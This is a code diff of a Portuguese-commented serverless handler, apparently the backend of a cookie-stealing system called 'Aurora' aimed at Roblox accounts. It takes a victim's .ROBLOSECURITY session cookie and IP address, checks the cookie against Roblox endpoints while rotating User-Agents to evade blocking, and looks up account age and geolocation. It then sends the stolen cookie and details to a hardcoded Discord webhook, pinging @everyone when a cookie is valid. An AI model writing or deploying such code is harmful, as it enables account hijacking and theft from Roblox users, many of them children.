@@ -4,12 +4,10 @@ export default async function handler(req, res) {
   res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
   res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
 
-  // Responder preflight requests
   if (req.method === 'OPTIONS') {
     return res.status(200).end();
   }
 
-  // Apenas POST
   if (req.method !== 'POST') {
     return res.status(405).json({ error: 'Method not allowed' });
   }
@@ -17,111 +15,145 @@ export default async function handler(req, res) {
   try {
     let { cookie, ip, device, timestamp } = req.body;
 
-    // Validar dados básicos
     if (!cookie) {
       return res.status(400).json({ error: 'Cookie não fornecido' });
     }
 
-    // ===== CORREÇÃO: FORMATAR O COOKIE CORRETAMENTE =====
-    let cookieOriginal = cookie;
-    let cookieFormatado = cookie;
+    // ===== LIMPAR E FORMATAR O COOKIE =====
+    let cookieOriginal = cookie.trim().replace(/^["']|["']$/g, '');
+    let cookieFormatado = cookieOriginal;
     
-    // Se o cookie NÃO começa com _|WARNING, adicionar o formato correto
-    if (!cookie.startsWith('_|WARNING') && !cookie.startsWith('WARNING')) {
-      // Verificar se é apenas o token (formato que você está testando)
-      if (cookie.length > 100 && !cookie.includes('WARNING')) {
-        cookieFormatado = `_|WARNING:-DO-NOT-SHARE-THIS.--${cookie}`;
-        console.log('Cookie formatado automaticamente');
-      }
+    // Se NÃO começar com o formato correto, adicionar
+    if (!cookieOriginal.startsWith('_|WARNING')) {
+      cookieFormatado = `_|WARNING:-DO-NOT-SHARE-THIS.--${cookieOriginal}`;
     }
 
-    // Limpar o cookie (remover aspas, espaços)
-    cookieFormatado = cookieFormatado.trim().replace(/^["']|["']$/g, '');
+    console.log('Cookie original:', cookieOriginal.substring(0, 50) + '...');
+    console.log('Cookie formatado:', cookieFormatado.substring(0, 50) + '...');
 
-    // ===== VERIFICAÇÃO DO COOKIE COM ROBLOX =====
-    let cookieValido = true;
+    // ===== MÚLTIPLAS TENTATIVAS DE VERIFICAÇÃO =====
+    let cookieValido = false;
     let contaRecente = false;
     let username = 'Desconhecido';
     let userId = null;
     let idadeConta = 'Desconhecida';
-    let erroValidacao = null;
+    let erroValidacao = 'Todas as tentativas falharam';
+    let dadosConta = null;
 
-    try {
-      console.log('Verificando cookie com Roblox...');
+    // Lista de User-Agents diferentes para evitar bloqueio
+    const userAgents = [
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+      'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
+    ];
+
+    // Tentar com diferentes combinações de cookie e user-agent
+    const tentativas = [
+      { cookie: cookieOriginal, url: 'https://users.roblox.com/v1/users/authenticated' },
+      { cookie: cookieFormatado, url: 'https://users.roblox.com/v1/users/authenticated' },
+      { cookie: cookieOriginal, url: 'https://www.roblox.com/mobileapi/userinfo' },
+      { cookie: cookieFormatado, url: 'https://www.roblox.com/mobileapi/userinfo' },
+      { cookie: cookieOriginal, url: 'https://economy.roblox.com/v1/users/1' }, // endpoint público
+      { cookie: cookieFormatado, url: 'https://economy.roblox.com/v1/users/1' }
+    ];
+
+    for (const tentativa of tentativas) {
+      if (cookieValido) break;
       
-      // Tentar com o cookie original primeiro
-      const robloxResponse = await fetch('https://users.roblox.com/v1/users/authenticated', {
-        method: 'GET',
-        headers: {
-          'Cookie': `.ROBLOSECURITY=${cookieOriginal}`,
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      for (const ua of userAgents) {
+        try {
+          console.log(`Tentando com ${tentativa.url}...`);
+          
+          const response = await fetch(tentativa.url, {
+            method: 'GET',
+            headers: {
+              'Cookie': `.ROBLOSECURITY=${tentativa.cookie}`,
+              'User-Agent': ua,
+              'Accept': 'application/json',
+              'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+              'Referer': 'https://www.roblox.com/'
+            }
+          });
+
+          if (response.ok) {
+            const data = await response.json();
+            
+            // Verificar se tem ID de usuário
+            if (data.id || data.UserID || data.userId) {
+              cookieValido = true;
+              userId = data.id || data.UserID || data.userId;
+              username = data.name || data.UserName || data.username || 'Desconhecido';
+              dadosConta = data;
+              
+              console.log('✅ Cookie válido! User ID:', userId);
+              
+              // Buscar data de criação
+              try {
+                const userResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
+                  headers: {
+                    'User-Agent': ua,
+                    'Accept': 'application/json'
+                  }
+                });
+                
+                if (userResponse.ok) {
+                  const userData = await userResponse.json();
+                  if (userData.created) {
+                    const dataCriacao = new Date(userData.created);
+                    const agora = new Date();
+                    const diffDias = Math.floor((agora - dataCriacao) / (1000 * 60 * 60 * 24));
+                    
+                    if (diffDias < 30) {
+                      contaRecente = true;
+                      idadeConta = `${diffDias} dias`;
+                    } else if (diffDias < 365) {
+                      const meses = Math.floor(diffDias / 30);
+                      idadeConta = `${meses} meses`;
+                    } else {
+                      const anos = Math.floor(diffDias / 365);
+                      idadeConta = `${anos} anos`;
+                    }
+                  }
+                }
+              } catch (e) {
+                console.log('Erro ao buscar data de criação:', e.message);
+              }
+              
+              break;
+            }
+          } else {
+            console.log(`Resposta não ok: ${response.status}`);
+          }
+        } catch (e) {
+          console.log(`Erro na tentativa: ${e.message}`);
         }
-      });
+      }
+    }
 
-      let responseData = null;
-      
-      if (robloxResponse.ok) {
-        responseData = await robloxResponse.json();
-      } else {
-        // Se falhou, tentar com o cookie formatado
-        console.log('Tentando com cookie formatado...');
-        const robloxResponse2 = await fetch('https://users.roblox.com/v1/users/authenticated', {
-          method: 'GET',
+    // Se ainda não conseguiu validar, tentar método alternativo
+    if (!cookieValido) {
+      try {
+        // Tentar com fetch para a página inicial (às vezes funciona)
+        const homeResponse = await fetch('https://www.roblox.com/home', {
           headers: {
             'Cookie': `.ROBLOSECURITY=${cookieFormatado}`,
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+            'User-Agent': userAgents[0]
           }
         });
 
-        if (robloxResponse2.ok) {
-          responseData = await robloxResponse2.json();
-          cookieOriginal = cookieFormatado; // Usar o formatado daqui pra frente
+        // Verificar se foi redirecionado para login
+        if (homeResponse.url.includes('home')) {
+          cookieValido = true;
+          username = 'Usuário Verificado';
+          console.log('✅ Cookie válido (método alternativo)');
         }
+      } catch (e) {
+        console.log('Erro no método alternativo:', e.message);
       }
-
-      if (!responseData) {
-        cookieValido = false;
-        erroValidacao = 'Cookie inválido ou expirado';
-      } else {
-        // Cookie válido - buscar informações da conta
-        username = responseData.name || 'Desconhecido';
-        userId = responseData.id;
-        
-        // Buscar data de criação da conta
-        const userInfoResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`);
-        if (userInfoResponse.ok) {
-          const userInfo = await userInfoResponse.json();
-          
-          if (userInfo.created) {
-            const dataCriacao = new Date(userInfo.created);
-            const agora = new Date();
-            const diffDias = Math.floor((agora - dataCriacao) / (1000 * 60 * 60 * 24));
-            
-            // Calcular idade da conta
-            if (diffDias < 30) {
-              contaRecente = true;
-              if (diffDias < 1) {
-                idadeConta = 'Menos de 1 dia';
-              } else {
-                idadeConta = `${diffDias} dias`;
-              }
-            } else if (diffDias < 365) {
-              const meses = Math.floor(diffDias / 30);
-              idadeConta = `${meses} meses`;
-            } else {
-              const anos = Math.floor(diffDias / 365);
-              idadeConta = `${anos} anos`;
-            }
-          }
-        }
-      }
-    } catch (e) {
-      console.error('Erro ao verificar cookie com Roblox:', e);
-      cookieValido = false;
-      erroValidacao = 'Erro ao conectar com Roblox';
     }
 
-    // Buscar informações detalhadas do IP
+    // Buscar informações do IP
     let ipInfo = {};
     try {
       const ipResponse = await fetch(`http://ip-api.com/json/${ip}?fields=66846719`);
@@ -133,7 +165,7 @@ export default async function handler(req, res) {
     // WEBHOOK DO DISCORD
     const webhookURL = 'https://canary.discord.com/api/webhooks/1480235860002734152/8ZjlQOiaHtPrE9bz-yGaM_GiMC3akI7ptVW-aElQUvTjsk8jauXoaho6B1anWmy8a8QE';
 
-    // Determinar cor e título baseado na validação
+    // Determinar cor e título
     let embedColor = 0x6366f1;
     let embedTitle = '🔐 **NOVA CAPTURA DE COOKIE**';
     let embedDescription = 'Um novo cookie foi capturado pelo sistema Aurora';
@@ -142,7 +174,7 @@ export default async function handler(req, res) {
     if (!cookieValido) {
       embedColor = 0xff0000;
       embedTitle = '❌ **COOKIE INVÁLIDO**';
-      embedDescription = `Cookie inválido: ${erroValidacao || 'Não foi possível validar'}`;
+      embedDescription = `Cookie inválido - Não foi possível verificar`;
     } else if (contaRecente) {
       embedColor = 0xffa500;
       embedTitle = '⚠️ **CONTA RECENTE**';
@@ -151,9 +183,6 @@ export default async function handler(req, res) {
     } else {
       embedContent = '@everyone ✅ COOKIE VÁLIDO';
     }
-
-    // Mostrar o cookie que foi usado (original ou formatado)
-    const cookieExibido = cookieOriginal || cookie;
 
     const embed = {
       content: embedContent,
@@ -164,7 +193,7 @@ export default async function handler(req, res) {
         fields: [
           {
             name: '🍪 **COOKIE**',
-            value: '```' + cookieExibido.substring(0, 100) + '...```'
+            value: '```' + cookieOriginal.substring(0, 100) + '...```'
           },
           {
             name: '👤 **INFORMAÇÕES DA CONTA**',
@@ -203,7 +232,7 @@ Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
           },
           {
             name: '📏 **TAMANHO**',
-            value: `\`${cookieExibido.length} caracteres\``,
+            value: `\`${cookieOriginal.length} caracteres\``,
             inline: true
           }
         ],
@@ -216,11 +245,15 @@ Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
     };
 
     // Enviar para o Discord
-    await fetch(webhookURL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
-    });
+    try {
+      await fetch(webhookURL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(embed)
+      });
+    } catch (e) {
+      console.log('Erro ao enviar para Discord:', e.message);
+    }
 
     // Retornar resultado para o frontend
     return res.status(200).json({ 
@@ -233,12 +266,15 @@ Proxy/VPN: ${ipInfo.proxy ? 'Sim' : 'Não'}
     });
     
   } catch (error) {
-    console.error('Erro:', error);
-    return res.status(500).json({ error: 'Erro interno' });
+    console.error('Erro geral:', error);
+    return res.status(500).json({ 
+      success: false,
+      valido: false,
+      error: 'Erro interno' 
+    });
   }
 }
 
-// Funções auxiliares
 function getBrowserInfo(req) {
   const ua = req.headers['user-agent'] || '';
   if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Google Chrome';
